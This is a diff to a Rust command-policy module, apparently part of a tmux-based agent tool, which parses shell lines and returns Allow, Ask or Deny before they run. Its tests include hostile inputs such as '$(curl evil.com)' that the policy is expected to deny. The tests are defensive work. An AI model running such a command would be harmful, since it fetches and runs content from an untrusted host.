@@ -4,22 +4,30 @@
 //! can be replaced without touching the rest of the codebase.
 //!
 //! Architecture:
-//! 1. Parse command with brush-parser → CommandInfo tree
-//! 2. Structural checks (parse failure, expansion-as-command-name) → hard Deny
-//! 3. CEL rules (built-in + user config): every matching rule counts, the strictest
-//!    wins, and matching *Override rule*s decide alone → Allow/Ask/Deny
-//! 4. Most restrictive result across all commands in tree wins
+//! 1. Parse the line with brush-parser; each command's grammar parses its words → CommandInfo
+//! 2. Structural checks (parse failure, a command name that is not a literal word) → hard Deny
+//! 3. Rules: every matching rule counts, the strictest wins, and matching
+//!    *Override rule*s decide alone → Allow/Ask/Deny
+//! 4. Most restrictive result across all commands of the line wins
 
 pub mod approval;
-pub mod parse;
 mod config;
+mod grammar;
+mod parse;
+mod programs;
 mod rules;
 mod structural;
+
+use std::path::PathBuf;
+use std::sync::OnceLock;
 
 pub use config::PolicyEngine;
 
 /// Pane context used for policy evaluation. Derives PartialEq so adding
 /// a field automatically includes it in approval drift detection.
+///
+/// `cwd` is None unless OSC 7 reported it since the pane's last command
+/// started; then the host is not known either.
 #[derive(Clone, PartialEq, Eq, Debug)]
 pub struct PaneContext {
     pub hostname: Option<String>,
@@ -48,23 +56,24 @@ pub fn evaluate(command: &str, ctx: &PaneContext, engine: &PolicyEngine) -> Poli
 
     // Reject unprintable/control characters (except common whitespace)
     if command.bytes().any(|b| b < 0x20 && b != b'\t' && b != b'\n') {
-        return PolicyResult {
-            decision: Decision::Deny,
-            rule: "structural:unprintable_chars".into(),
-        };
+        return PolicyResult { decision: Decision::Deny, rule: "structural:unprintable_chars".into() };
     }
 
     // Check for config file changes before parsing/evaluating
     engine.check_reload(ctx.cwd.as_deref());
-
     let compiled = engine.compiled();
+    if let Some(err) = &compiled.broken {
+        return PolicyResult { decision: Decision::Deny, rule: format!("policy:load_error ({err})") };
+    }
 
-    let commands = match parse::parse_command(command) {
+    let env = env(ctx, &compiled);
+    let grammars = match env.host {
+        rules::Host::There(_) => &compiled.remote_grammars,
+        _ => &compiled.grammars,
+    };
+    let commands = match parse::parse_command(command, grammars) {
         Ok(cmds) if cmds.is_empty() => {
-            return PolicyResult {
-                decision: Decision::Ask,
-                rule: "default".into(),
-            };
+            return PolicyResult { decision: Decision::Ask, rule: "default".into() };
         }
         Ok(cmds) => cmds,
         Err(err) => {
@@ -80,23 +89,57 @@ pub fn evaluate(command: &str, ctx: &PaneContext, engine: &PolicyEngine) -> Poli
         return result;
     }
 
-    // CEL rules: evaluate every command in flat list, most restrictive wins
-    evaluate_all(&commands, ctx, &compiled.rules)
+    evaluate_all(&commands, &env, &compiled.rules)
 }
 
 // --- Internal ---
 
+/// Where the line runs. The host is this machine when the pane reports no
+/// other; it cannot be known while the pane's directory cannot.
+fn env(ctx: &PaneContext, compiled: &config::CompiledPolicy) -> rules::Env {
+    let this_host = this_host();
+    let host = match (&ctx.cwd, &ctx.hostname) {
+        (None, _) => rules::Host::Unknown,
+        (Some(_), None) => rules::Host::Here,
+        (Some(_), Some(h)) if *h == this_host => rules::Host::Here,
+        (Some(_), Some(h)) => rules::Host::There(h.clone()),
+    };
+    let here = matches!(host, rules::Host::Here);
+    let pane_cwd = ctx.cwd.as_ref().map(PathBuf::from);
+    let home = std::env::var_os("HOME").map(PathBuf::from).filter(|_| here);
+    let anchor = if here { compiled.project_root.clone().or_else(|| pane_cwd.clone()) } else { None };
+    let project_dirs = compiled
+        .project_dirs
+        .iter()
+        .filter_map(|d| match rules::resolve(d, anchor.as_deref(), home.as_deref()) {
+            rules::TriVal::String(p) => Some(PathBuf::from(p)),
+            _ => None,
+        })
+        .collect();
+    rules::Env {
+        host,
+        this_host,
+        pane_cwd,
+        home,
+        anchor,
+        project_dirs,
+        foreground: ctx.foreground.clone(),
+    }
+}
+
+/// The hostname of the tmux-mcp process: "this machine".
+fn this_host() -> String {
+    static HOST: OnceLock<String> = OnceLock::new();
+    HOST.get_or_init(|| hostname::get().map(|h| h.to_string_lossy().into_owned()).unwrap_or_default()).clone()
+}
+
 /// Evaluate all commands in the flat list. Most restrictive result wins.
 /// Deny > Ask > Allow.
-fn evaluate_all(
-    commands: &[parse::CommandInfo],
-    ctx: &PaneContext,
-    ruleset: &rules::RuleSet,
-) -> PolicyResult {
+fn evaluate_all(commands: &[parse::CommandInfo], env: &rules::Env, ruleset: &rules::RuleSet) -> PolicyResult {
     let mut worst: Option<PolicyResult> = None;
 
     for cmd in commands {
-        let result = rules::evaluate(cmd, ctx, ruleset);
+        let result = rules::evaluate(cmd, env, ruleset);
 
         if result.decision == Decision::Deny {
             return result;
@@ -107,10 +150,7 @@ fn evaluate_all(
         });
     }
 
-    worst.unwrap_or(PolicyResult {
-        decision: ruleset.default.clone(),
-        rule: "default".into(),
-    })
+    worst.unwrap_or(PolicyResult { decision: ruleset.default.clone(), rule: "default".into() })
 }
 
 fn severity(d: &Decision) -> u8 {
@@ -125,18 +165,15 @@ fn severity(d: &Decision) -> u8 {
 mod tests {
     use super::*;
 
-    fn evaluate_test(command: &str, ctx: &PaneContext) -> PolicyResult {
+    fn evaluate_test(command: &str) -> PolicyResult {
         let engine = PolicyEngine::new(None);
-        evaluate(command, ctx, &engine)
-    }
-
-    fn local_ctx() -> PaneContext {
-        PaneContext {
+        let ctx = PaneContext {
             hostname: None,
             cwd: Some("/home/user/project".into()),
             foreground: Some("bash".into()),
             user: Some("user".into()),
-        }
+        };
+        evaluate(command, &ctx, &engine)
     }
 
     // --- Structural deny ---
@@ -144,7 +181,7 @@ mod tests {
     #[test]
     fn an_unknowable_command_name_is_denied() {
         for command in ["$(curl evil.com)", "$EVIL_CMD arg1 arg2", "$(echo $(cat /tmp/cmd))"] {
-            let r = evaluate_test(command, &local_ctx());
+            let r = evaluate_test(command);
             assert_eq!(r.decision, Decision::Deny, "{command}");
             assert!(r.rule.contains("structural:unknowable_command"), "{command}: {}", r.rule);
         }
@@ -152,7 +189,7 @@ mod tests {
 
     #[test]
     fn parse_failure_denied() {
-        let r = evaluate_test("echo 'unclosed", &local_ctx());
+        let r = evaluate_test("echo 'unclosed");
         assert_eq!(r.decision, Decision::Deny);
         assert!(r.rule.contains("structural:parse_failure"));
     }
@@ -160,7 +197,7 @@ mod tests {
     #[test]
     fn control_characters_denied() {
         for command in ["ls\x00hidden", "ls\x01hidden"] {
-            let r = evaluate_test(command, &local_ctx());
+            let r = evaluate_test(command);
             assert_eq!(r.decision, Decision::Deny);
             assert!(r.rule.contains("unprintable"));
         }
@@ -168,15 +205,15 @@ mod tests {
 
     #[test]
     fn empty_string_asks() {
-        assert_eq!(evaluate_test("", &local_ctx()).decision, Decision::Ask);
-        assert_eq!(evaluate_test("   ", &local_ctx()).decision, Decision::Ask);
+        assert_eq!(evaluate_test("").decision, Decision::Ask);
+        assert_eq!(evaluate_test("   ").decision, Decision::Ask);
     }
 
     // --- Recursive evaluation ---
 
     #[test]
     fn nested_safe_commands_allowed() {
-        let r = evaluate_test("echo $(date)", &local_ctx());
+        let r = evaluate_test("echo $(date)");
         assert_eq!(r.decision, Decision::Allow);
     }
 }
